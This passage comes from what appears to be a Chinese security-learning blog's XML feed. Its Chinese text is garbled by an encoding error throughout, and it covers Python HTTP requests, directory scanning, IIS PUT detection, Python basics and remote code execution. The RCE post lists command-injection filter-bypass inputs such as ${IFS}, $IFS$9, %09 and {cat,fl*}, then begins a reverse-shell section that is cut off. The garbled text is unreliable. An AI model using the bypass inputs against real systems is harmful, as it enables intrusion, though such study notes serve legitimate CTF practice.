å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨$</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonäºwebå±‚åº”ç”¨</title>
      <link href="/posts/4256.html"/>
      <url>/posts/4256.html</url>
      
        <content type="html"><![CDATA[<h1 id="Pythonäºwebå±‚åº”ç”¨"><a href="#Pythonäºwebå±‚åº”ç”¨" class="headerlink" title="Pythonäºwebå±‚åº”ç”¨"></a>Pythonäºwebå±‚åº”ç”¨</h1><h2 id="HTTPåè®®åŸºç¡€"><a href="#HTTPåè®®åŸºç¡€" class="headerlink" title="HTTPåè®®åŸºç¡€"></a>HTTPåè®®åŸºç¡€</h2><h3 id="åè®®åˆ†ç±»"><a href="#åè®®åˆ†ç±»" class="headerlink" title="åè®®åˆ†ç±»"></a>åè®®åˆ†ç±»</h3><p>HTTP 1.0 80ç«¯å£ å•æ¬¡ä¸€ä¸ªé“¾æ¥</p><p>HTTP 1.1 80ç«¯å£ å¤šæ¬¡å¯ä¸€ä¸ªé“¾æ¥</p><p>HTTPåè®®ä¸å¤Ÿå®‰å…¨ï¼Œè¿›è€Œå‘å±•å‡ºäº†HTTPSåè®®</p><p>HTTPS 443ç«¯å£ åŠ å¯†åæ•°æ®ä¼ è¾“</p><span id="more"></span><h3 id="è¯·æ±‚æ–¹æ³•"><a href="#è¯·æ±‚æ–¹æ³•" class="headerlink" title="è¯·æ±‚æ–¹æ³•"></a>è¯·æ±‚æ–¹æ³•</h3><h6 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP 1.0"></a>HTTP 1.0</h6><p>GET POST HEAD</p><h6 id="HTTP-1-1ä¸HTTPS"><a href="#HTTP-1-1ä¸HTTPS" class="headerlink" title="HTTP 1.1ä¸HTTPS"></a>HTTP 1.1ä¸HTTPS</h6><p>OPTIONS PUT DELETE TRACE CONNECT PATCH</p><h3 id="URLæ ¼å¼"><a href="#URLæ ¼å¼" class="headerlink" title="URLæ ¼å¼"></a>URLæ ¼å¼</h3><p>åè®®://ä¸»æœºå.åŸŸå/æ–‡ä»¶å¤¹/æ–‡ä»¶?å‚æ•°=å€¼&amp;å‚æ•°=å€¼</p><h3 id="HTTPè¯·æ±‚å¤´"><a href="#HTTPè¯·æ±‚å¤´" class="headerlink" title="HTTPè¯·æ±‚å¤´"></a>HTTPè¯·æ±‚å¤´</h3><p>User-Agentï¼šæµè§ˆå™¨ç‰ˆæœ¬ä¿¡æ¯</p><p>Accept-encodingï¼šæµè§ˆå™¨æ¥å—çš„ç¼–ç </p><p>Refererï¼šå½“å‰ç½‘é¡µè·³è½¬æ¥æº</p><p>Cookieï¼šé¡¾åæ€ä¹‰ï¼Œ<del>å¥½åƒçš„é¥¼å¹²ï¼Œ</del>Cookieä¿¡æ¯</p><p>Locationï¼šè·³è½¬åˆ°å“ªé‡Œ</p><p>Set-Cookieï¼šè®¾ç½®Cookieä¿¡æ¯</p><p>WWW-Authenticateï¼šç”¨äºèº«ä»½éªŒè¯HTTP Basicç­‰</p><h3 id="HTTPå“åº”çŠ¶æ€ç "><a href="#HTTPå“åº”çŠ¶æ€ç " class="headerlink" title="HTTPå“åº”çŠ¶æ€ç "></a>HTTPå“åº”çŠ¶æ€ç </h3><p>1XXï¼šä¿¡æ¯æç¤º</p><p>2XXï¼šæˆåŠŸ</p><p>3XXï¼šé‡å®šå‘</p><p>4XXï¼šå®¢æˆ·ç«¯é”™è¯¯</p><p>5XXï¼šæœåŠ¡ç«¯é”™è¯¯</p><h3 id="æŸ¥çœ‹HTTP"><a href="#æŸ¥çœ‹HTTP" class="headerlink" title="æŸ¥çœ‹HTTP"></a>æŸ¥çœ‹HTTP</h3><p>ä½¿ç”¨æµè§ˆå™¨å®¡æŸ¥è¿›è¡ŒæŸ¥çœ‹</p><p>ä½¿ç”¨Burpsuiteæˆªæ–­æŸ¥çœ‹</p><h2 id="Pythonä½¿ç”¨HTTPè¯·æ±‚"><a href="#Pythonä½¿ç”¨HTTPè¯·æ±‚" class="headerlink" title="Pythonä½¿ç”¨HTTPè¯·æ±‚"></a>Pythonä½¿ç”¨HTTPè¯·æ±‚</h2><h6 id="GETè¯·æ±‚"><a href="#GETè¯·æ±‚" class="headerlink" title="GETè¯·æ±‚"></a>GETè¯·æ±‚</h6><p>ä¸å¸¦å‚æ•°<code>requests.get(url)</code></p><p>å¸¦å‚æ•°<code>requests.get(url=url,params=&#123;&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;&#125;)</code></p><p>è¿”å›çš„å¯¹è±¡r.urlè·å–url</p><h6 id="POSTè¯·æ±‚"><a href="#POSTè¯·æ±‚" class="headerlink" title="POSTè¯·æ±‚"></a>POSTè¯·æ±‚</h6><p>ä¸å¸¦å‚æ•°<code>requests.post(url)</code></p><p>å¸¦å‚æ•°<code>requests.post(url=url,data=&#123;&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;&#125;)</code></p><h6 id="è‡ªå®šä¹‰è¯·æ±‚å¤´"><a href="#è‡ªå®šä¹‰è¯·æ±‚å¤´" class="headerlink" title="è‡ªå®šä¹‰è¯·æ±‚å¤´"></a>è‡ªå®šä¹‰è¯·æ±‚å¤´</h6><p>headers={key1:value1,key2:value2}</p><p>requests.get(url=url,headers=headers)</p><h6 id="å…¶ä»–è¯·æ±‚"><a href="#å…¶ä»–è¯·æ±‚" class="headerlink" title="å…¶ä»–è¯·æ±‚"></a>å…¶ä»–è¯·æ±‚</h6><p>requests.put(url,data)</p><p>requests.delete(url)</p><p>requests.head(url)</p><p>requests.options(url)</p><h2 id="Pythonå¤„ç†HTTPå“åº”"><a href="#Pythonå¤„ç†HTTPå“åº”" class="headerlink" title="Pythonå¤„ç†HTTPå“åº”"></a>Pythonå¤„ç†HTTPå“åº”</h2><p><strong>è·å–ç›¸åº”çŠ¶æ€ç ï¼š</strong>r.status_code</p><p><strong>è·å–å“åº”æ–‡æœ¬ï¼š</strong>r.contentï¼ˆè·å–åˆ°äºŒè¿›åˆ¶å†…å®¹ï¼‰r.textï¼ˆè·å–åŸå§‹æ–‡æœ¬ä»£ç ï¼‰</p><p><strong>è·å–ç›¸åº”å¤´ï¼š</strong>r.headers</p><p><strong>è·å–è¯·æ±‚å¤´ï¼š</strong>r.reuqests.headers</p><p><strong>è·å–è¯·æ±‚URLï¼š</strong>r.url</p><p><strong>è·å–Cookieï¼š</strong>r.cookies</p><h2 id="Pythonè®¾ç½®HTTPä»£ç†"><a href="#Pythonè®¾ç½®HTTPä»£ç†" class="headerlink" title="Pythonè®¾ç½®HTTPä»£ç†"></a>Pythonè®¾ç½®HTTPä»£ç†</h2><p><strong>ä»£ç†è®¾ç½®ï¼š</strong>httpå’Œhttps:<code>proxies=&#123;&#39;http&#39;:&#39;http://ä»£ç†æœåŠ¡å™¨:ä»£ç†ç«¯å£&#39;,&#39;https&#39;:&#39;https://ä»£ç†æœåŠ¡å™¨:ä»£ç†ç«¯å£&#39;&#125;</code></p><p><strong>å‚æ•°è®¾ç½®ï¼š</strong><code>proxies=proxies,verfiy=False</code></p><h2 id="Pythonä¼šè¯ç¼–ç¨‹"><a href="#Pythonä¼šè¯ç¼–ç¨‹" class="headerlink" title="Pythonä¼šè¯ç¼–ç¨‹"></a>Pythonä¼šè¯ç¼–ç¨‹</h2><p>é€šè¿‡Set-Cookieè®¾ç½®ä¸€ä¸ªcookieå€¼</p><p>ä½¿ç”¨<code>s=requesets.Session()</code>å»ºç«‹ä¸€ä¸ªæ–°çš„ç©ºä¼šè¯</p><p><code>r=s.get(url)</code>æ¥åœ¨ä¼šè¯ä¸­å‘èµ·ä¸ªä½“è¯·æ±‚</p><h2 id="Pythonåˆ¶ä½œç›®å½•æ‰«æå·¥å…·"><a href="#Pythonåˆ¶ä½œç›®å½•æ‰«æå·¥å…·" class="headerlink" title="Pythonåˆ¶ä½œç›®å½•æ‰«æå·¥å…·"></a>Pythonåˆ¶ä½œç›®å½•æ‰«æå·¥å…·</h2><h6 id="ç›®å½•æ‰«æåŸç†"><a href="#ç›®å½•æ‰«æåŸç†" class="headerlink" title="ç›®å½•æ‰«æåŸç†"></a>ç›®å½•æ‰«æåŸç†</h6><p>1ã€è¯»å–å­—å…¸æ–‡ä»¶æ‹¼æ¥URL</p><p>2ã€é€šè¿‡getè¯·æ±‚è®¿é—®URL</p><p>3ã€è·å–çŠ¶æ€ç åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨</p><h6 id="å­—å…¸æ–‡ä»¶è¯»å–"><a href="#å­—å…¸æ–‡ä»¶è¯»å–" class="headerlink" title="å­—å…¸æ–‡ä»¶è¯»å–"></a>å­—å…¸æ–‡ä»¶è¯»å–</h6><p>1ã€<code>with open(&quot;filename.txt&quot;,&quot;r&quot;) as f:</code></p><p>2ã€è¯»å–æ–¹å¼ï¼š</p><ul><li><code>f.readline()//è¯»å–ä¸€è¡Œ</code></li><li><code>f.readlines()//é€è¡Œè¯»å–åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­</code></li><li><code>f.read(å­—èŠ‚æ•°)//æŒ‰å­—èŠ‚è¯»</code></li><li><code>line.strip()//å»é™¤ç©ºè¡Œ</code></li></ul><p>3ã€<code>f.close()</code>å…³é—­æ–‡ä»¶æµ</p><p>4ã€sysåº“ä¸­çš„sys.argv[0]ä¸ºå½“å‰pythonæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œsys.argv[1]ä¸ºä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°</p><p>5ã€User-Agenté€šè¿‡æŠ“åŒ…å…ˆè·å–çœŸå®çš„User-Agentï¼Œå†é€šè¿‡headerså­—å…¸ä¼ å…¥getè¯·æ±‚</p><h2 id="IIS-PUTæ¼æ´"><a href="#IIS-PUTæ¼æ´" class="headerlink" title="IIS PUTæ¼æ´"></a>IIS PUTæ¼æ´</h2><p>IISä¸­æ‹“å±•å·¥å…·WebDAVæ”¯æŒHTTPæ–¹æ³•ï¼Œä¹Ÿæä¾›äº†ä¸€äº›å…¶ä»–åŠŸèƒ½å¼ºå¤§çš„æ–¹æ³•ï¼ˆMoveï¼‰ï¼Œä½¿å¾—å¼€å¯WebDAVå¯ä»¥ç›´æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶</p><p><strong>æ¢æµ‹æ–¹æ³•ï¼š</strong>é€šè¿‡HTTPä¸­optionsæ–¹æ³•å¯ä»¥æ¢æµ‹å‡ºæœåŠ¡å™¨æ”¯æŒçš„HTTPæ–¹æ³•</p><p><strong>æ¢æµ‹è¿‡ç¨‹ï¼š</strong></p><ul><li>ç¡®å®šç›®æ ‡ä¸»æœº</li><li>ä½¿ç”¨HTTP optionsæ–¹æ³•æ¢æµ‹</li><li>æŸ¥çœ‹è¿”å›ç»“æœä¸­æ˜¯å¦å­˜åœ¨MOVE PUT</li><li>æŸ¥çœ‹å“åº”å¤´ä¸­çš„PUBLICå±æ€§</li></ul><h2 id="æ¢æµ‹æœåŠ¡å™¨ä¿¡æ¯"><a href="#æ¢æµ‹æœåŠ¡å™¨ä¿¡æ¯" class="headerlink" title="æ¢æµ‹æœåŠ¡å™¨ä¿¡æ¯"></a>æ¢æµ‹æœåŠ¡å™¨ä¿¡æ¯</h2><p>ç›¸åº”å¤´ä¸­çš„Serverï¼šæœåŠ¡å™¨ä¸­é—´ä»¶å±æ€§</p><p>X-Powered-Byï¼šæœåŠ¡å™¨è„šæœ¬æŠ€æœ¯</p><h2 id="Pythonåˆ¶ä½œæ¼æ´æ£€æµ‹å·¥å…·"><a href="#Pythonåˆ¶ä½œæ¼æ´æ£€æµ‹å·¥å…·" class="headerlink" title="Pythonåˆ¶ä½œæ¼æ´æ£€æµ‹å·¥å…·"></a>Pythonåˆ¶ä½œæ¼æ´æ£€æµ‹å·¥å…·</h2><p>é¦–å…ˆäº†è§£æ¼æ´äº§ç”ŸåŸç†ï¼Œæ ¹æ®æ¼æ´åŸç†å†™å‡ºå¯¹åº”çš„POCä»£ç æ¥éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨</p><h2 id="æ„å»ºç«™ç‚¹åœ°å›¾"><a href="#æ„å»ºç«™ç‚¹åœ°å›¾" class="headerlink" title="æ„å»ºç«™ç‚¹åœ°å›¾"></a>æ„å»ºç«™ç‚¹åœ°å›¾</h2><p>æµ‹è¯•Web Appçš„é¦–è¦ä»»åŠ¡å°±æ˜¯è·å–ç«™ç‚¹å®Œæ•´çš„ç›®å½•å’Œæ–‡ä»¶</p><h6 id="æŠ€æœ¯ç§ç±»ï¼šå»ºè®®ä½¿ç”¨ä¸¤ç§æ–¹å¼åŒæ—¶è¿›è¡Œ"><a href="#æŠ€æœ¯ç§ç±»ï¼šå»ºè®®ä½¿ç”¨ä¸¤ç§æ–¹å¼åŒæ—¶è¿›è¡Œ" class="headerlink" title="æŠ€æœ¯ç§ç±»ï¼šå»ºè®®ä½¿ç”¨ä¸¤ç§æ–¹å¼åŒæ—¶è¿›è¡Œ"></a>æŠ€æœ¯ç§ç±»ï¼šå»ºè®®ä½¿ç”¨ä¸¤ç§æ–¹å¼åŒæ—¶è¿›è¡Œ</h6><p>1ã€é€šè¿‡åŸºäºå­—å…¸çš„ç›®å½•æ–‡ä»¶æ‰«æ</p><p>2ã€é€šè¿‡åŸºäºç½‘ç»œçˆ¬è™«çš„æŠ€æœ¯ï¼ˆå¯é€šè¿‡requestsåº“æ„å»ºï¼Œä½†æ˜¯å¾ˆå¤æ‚ï¼Œæœ‰scrapyåº“å¯ç”¨äºæ„å»ºçˆ¬è™«ï¼‰</p><p>3ã€é€šè¿‡Burpsuiteæ„å»ºç½‘ç«™åœ°å›¾</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonåŸºç¡€</title>
      <link href="/posts/14702.html"/>
      <url>/posts/14702.html</url>
      
        <content type="html"><![CDATA[<h1 id="PythonåŸºç¡€"><a href="#PythonåŸºç¡€" class="headerlink" title="PythonåŸºç¡€"></a>PythonåŸºç¡€</h1><h4 id="æ•°æ®ç±»å‹ï¼š"><a href="#æ•°æ®ç±»å‹ï¼š" class="headerlink" title="æ•°æ®ç±»å‹ï¼š"></a>æ•°æ®ç±»å‹ï¼š</h4><p>stringï¼ˆå­—ç¬¦ä¸²ï¼‰</p><p>numï¼ˆæ•°å­—ï¼‰</p><p>boolï¼ˆå¸ƒå°”ï¼‰</p><p>listï¼ˆåˆ—è¡¨ï¼‰ä½¿ç”¨[    ]å®šä¹‰</p><p>tupleï¼ˆå…ƒç»„ï¼‰ä½¿ç”¨{     }å®šä¹‰ï¼ˆæ— åºï¼‰</p><p>dictionaryï¼ˆå­—å…¸ï¼‰ä½¿ç”¨{     }å®šä¹‰ï¼Œå†…å®¹ä¸ºï¼šä¸‹æ ‡å:å…ƒç´ å†…å®¹</p><span id="more"></span><h4 id="å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ï¼š"><a href="#å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ï¼š" class="headerlink" title="å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ï¼š"></a>å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ï¼š</h4><h6 id="æŸ¥æ‰¾ï¼š"><a href="#æŸ¥æ‰¾ï¼š" class="headerlink" title="æŸ¥æ‰¾ï¼š"></a>æŸ¥æ‰¾ï¼š</h6><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token operator">//</span>rfindä»æœ«å°¾å¼€å§‹æŸ¥æ‰¾<span class="token builtin">str</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token operator">//</span>rindexä»æœ«å°¾å¼€å§‹æŸ¥æ‰¾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨str1ï¼Œå­˜åœ¨è¿”å›ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä¸å­˜åœ¨findè¿”å›-1ï¼ŒindexæŠ¥é”™</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­æŸå­—ç¬¦ä¸²å‡ºç°çš„æ¬¡æ•°</p><h6 id="æ›¿æ¢ï¼š"><a href="#æ›¿æ¢ï¼š" class="headerlink" title="æ›¿æ¢ï¼š"></a>æ›¿æ¢ï¼š</h6><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>old<span class="token punctuation">,</span>new<span class="token punctuation">,</span>count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°†å­—ç¬¦ä¸²ä¸­oldå†…å®¹æ›¿æ¢ä¸ºnewï¼Œcountä¸ºæœ€å¤§æ›¿æ¢æ¬¡æ•°ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²ï¼Œä¸æ”¹å˜åŸæ¥å­—ç¬¦ä¸²</p><h6 id="åˆ‡å‰²ï¼š"><a href="#åˆ‡å‰²ï¼š" class="headerlink" title="åˆ‡å‰²ï¼š"></a>åˆ‡å‰²ï¼š</h6><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°†å­—ç¬¦ä¸²ä»¥str1ä¸ºåˆ†éš”åˆ‡å‰²ï¼Œcountä¸ºæœ€å¤§åˆ‡å‰²æ¬¡æ•°ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œä¸æ”¹å˜åŸæœ‰å­—ç¬¦ä¸²ï¼Œé»˜è®¤æŒ‰ç©ºç™½å­—ç¬¦è¿›è¡Œå…¨åˆ‡å‰²</p><h6 id="åŠ å…¥ï¼š"><a href="#åŠ å…¥ï¼š" class="headerlink" title="åŠ å…¥ï¼š"></a>åŠ å…¥ï¼š</h6><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>å¯è¿­ä»£å¯¹è±¡<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°†stræ’å…¥åˆ°å¯è¿­ä»£å¯¹è±¡ä¸¤ä¸ªå…ƒç´ ä¹‹é—´ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²</p><h6 id="ä¹±ä¸ƒå…«ç³Ÿï¼š"><a href="#ä¹±ä¸ƒå…«ç³Ÿï¼š" class="headerlink" title="ä¹±ä¸ƒå…«ç³Ÿï¼š"></a>ä¹±ä¸ƒå…«ç³Ÿï¼š</h6><pre class="line-numbers language-python" data-language="python"><code class="language-python">capitalize<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token operator">//</span>å°†å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—æ¯å¤§å†™title<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token operator">//</span>å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™<span class="token builtin">str</span><span class="token punctuation">.</span>startwith<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">//</span>æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥str1å¼€å¤´<span class="token builtin">str</span><span class="token punctuation">.</span>endwith<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">//</span>æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥str1ç»“å°¾<span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>å­—æ¯å…¨å¤§å†™<span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>å­—æ¯å…¨å°å†™<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>inputè¾“å…¥</p><p>printè¾“å‡º</p><p>readè¯»æ–‡ä»¶ï¼ˆæŒ‰å­—èŠ‚è¯»ï¼‰ï¼Œreadlineï¼ˆæŒ‰è¡Œè¯»ï¼‰</p><p>open(â€œæ–‡ä»¶åâ€ï¼Œâ€æ‰“å¼€æ–¹å¼ï¼ˆråªè¯»ï¼Œwå†™å…¥ï¼Œaè¿½åŠ ï¼Œï¼ˆbï¼‰ä»£è¡¨ä»¥äºŒè¿›åˆ¶æ‰“å¼€ï¼Œï¼ˆ+ï¼‰ä»£è¡¨è¯»å†™ï¼‰â€ï¼Œencoding=â€ç¼–ç æ–¹å¼â€)æ‰“å¼€æ–‡ä»¶ï¼ˆä»¥äºŒè¿›åˆ¶è¿›è¡Œè¯»å†™æ—¶ä¸èƒ½æŒ‡å®šencodingæ–¹å¼ï¼‰</p><p>*argsä¸å®šé•¿å‚æ•°ï¼Œæ¥æ”¶åç”Ÿæˆå…ƒç»„</p><p>**kwargsä¸å®šé•¿å‚æ•°ï¼Œæ¥æ”¶åç”Ÿæˆå­—å…¸</p><h4 id="Pythonå†…å­˜ç®¡ç†æœºåˆ¶ï¼šå¼•ç”¨è®¡æ•°"><a href="#Pythonå†…å­˜ç®¡ç†æœºåˆ¶ï¼šå¼•ç”¨è®¡æ•°" class="headerlink" title="Pythonå†…å­˜ç®¡ç†æœºåˆ¶ï¼šå¼•ç”¨è®¡æ•°"></a>Pythonå†…å­˜ç®¡ç†æœºåˆ¶ï¼šå¼•ç”¨è®¡æ•°</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#aåœ°å€å¼•ç”¨ä¸º1</span>b<span class="token operator">=</span>a <span class="token comment">#aåœ°å€å¼•ç”¨ä¸º2</span><span class="token keyword">del</span> a <span class="token comment">#aåœ°å€å¼•ç”¨ä¸º1</span><span class="token keyword">del</span> b <span class="token comment">#aåœ°å€å¼•ç”¨ä¸º0ï¼Œæ­¤æ—¶aå¼•ç”¨åœ°å€è¢«é”€æ¯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCEè¿œç¨‹ä»£ç æ‰§è¡Œ</title>
      <link href="/posts/47881.html"/>
      <url>/posts/47881.html</url>
      
        <content type="html"><![CDATA[<h1 id="RCEè¿œç¨‹ä»£ç æ‰§è¡Œ"><a href="#RCEè¿œç¨‹ä»£ç æ‰§è¡Œ" class="headerlink" title="RCEè¿œç¨‹ä»£ç æ‰§è¡Œ"></a><strong>RCEè¿œç¨‹ä»£ç æ‰§è¡Œ</strong></h1><h4 id="ä¸€ã€RCEèƒ½åšåˆ°ä»€ä¹ˆï¼š"><a href="#ä¸€ã€RCEèƒ½åšåˆ°ä»€ä¹ˆï¼š" class="headerlink" title="ä¸€ã€RCEèƒ½åšåˆ°ä»€ä¹ˆï¼š"></a><strong>ä¸€ã€RCEèƒ½åšåˆ°ä»€ä¹ˆï¼š</strong></h4><p>1ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 2ã€è®°å½•ç”¨æˆ·è¾“å…¥ 3ã€æ§åˆ¶é”®ç›˜é¼ æ ‡ 4ã€ä»»æ„ä¸Šä¼ ä¸‹è½½ 5ã€æˆªå±</p><span id="more"></span><h4 id="äºŒã€RCEäº§ç”ŸåŸå› ï¼š"><a href="#äºŒã€RCEäº§ç”ŸåŸå› ï¼š" class="headerlink" title="äºŒã€RCEäº§ç”ŸåŸå› ï¼š"></a><strong>äºŒã€RCEäº§ç”ŸåŸå› ï¼š</strong></h4><p>1ã€æœåŠ¡å™¨ä¸Šæœ‰æœ¨é©¬ </p><p>2ã€è„†å¼±æœåŠ¡æœªæˆæƒ</p><p>3ã€é€šè¿‡æ•°æ®åº“å†™æœ¨é©¬ </p><p>4ã€æ–‡ä»¶ä¸Šä¼ /æ–‡ä»¶åŒ…å« </p><p>5ã€å±é™©å‡½æ•°ï¼ˆevalï¼Œassertï¼Œsystemï¼Œshell_execï¼Œexecï¼Œfile_put_contentsï¼‰ </p><p>6ã€å‘½ä»¤æ‰§è¡Œ </p><p>7ã€ååºåˆ—åŒ–</p><h4 id="ä¸‰ã€RCEè¿œç¨‹ä»£ç æ‰§è¡Œå…³é”®ç‚¹ï¼š"><a href="#ä¸‰ã€RCEè¿œç¨‹ä»£ç æ‰§è¡Œå…³é”®ç‚¹ï¼š" class="headerlink" title="ä¸‰ã€RCEè¿œç¨‹ä»£ç æ‰§è¡Œå…³é”®ç‚¹ï¼š"></a><strong>ä¸‰ã€RCEè¿œç¨‹ä»£ç æ‰§è¡Œå…³é”®ç‚¹ï¼š</strong></h4><h5 id="1ã€RCEé»‘åå•è¿‡æ»¤ï¼š"><a href="#1ã€RCEé»‘åå•è¿‡æ»¤ï¼š" class="headerlink" title="1ã€RCEé»‘åå•è¿‡æ»¤ï¼š"></a><strong>1ã€RCEé»‘åå•è¿‡æ»¤ï¼š</strong></h5><p>linuxæ‰§è¡Œå‘½ä»¤ç‰¹æ®Šå­—ç¬¦ï¼šï¼ˆ;åˆ†å‰²å‘½ä»¤ï¼‰ï¼ˆ&amp;&amp;åœ¨å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„å‰æä¸‹æ‰§è¡Œåé¢å‘½ä»¤ï¼‰ï¼ˆ||å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå¤±è´¥çš„å‰æä¸‹æ‰§è¡Œåé¢å‘½ä»¤ï¼‰ï¼ˆ|å°†å‰é¢å‘½ä»¤æ‰§è¡Œçš„ç»“æœä½œä¸ºè¾“å…¥ï¼Œè¾“å…¥åˆ°åé¢å‘½ä»¤ä¸­æ‰§è¡Œï¼‰ï¼ˆ``å°†å‘½ä»¤æ‰§è¡Œç»“æœä½œä¸ºå‘½ä»¤å†æ¬¡æ‰§è¡Œï¼‰ï¼ˆ$()å’Œå‰ä¸€ä¸ªä¸€æ ·ï¼‰</p><p>è¿‡æ»¤ç©ºæ ¼åå¯ä½¿ç”¨&lt;å‘å‘½ä»¤ä¼ å…¥å‚æ•°ï¼Œ${IFS}ä¸ºç©ºæ ¼ï¼Œ%0aä¸ºåˆ†å·è½¬è¯‘</p><p><code>catç»•è¿‡å¯ä½¿ç”¨tac more less head tac tail nl od(äºŒè¿›åˆ¶æŸ¥çœ‹) vi vim sort uniq</code></p><p><code>ç»•è¿‡ç©ºæ ¼ç”¨%09 &lt;&gt; $&#123;IFS&#125; $IFS$9 &#123;cat,fl*&#125; %20</code></p><p><code>flagç»•è¿‡å¯ä½¿ç”¨é€šé…ç¬¦f*</code></p><h5 id="2ã€RCEæ— å›æ˜¾ï¼š"><a href="#2ã€RCEæ— å›æ˜¾ï¼š" class="headerlink" title="2ã€RCEæ— å›æ˜¾ï¼š"></a><strong>2ã€RCEæ— å›æ˜¾ï¼š</strong></h5><p>ï¼ˆ1ï¼‰ã€åå¼¹shellï¼šæ”»å‡»ç«¯ç›‘å¬ä¸€ä¸ªç«¯å£å¦‚ï¼š2333 </p><p>â€‹    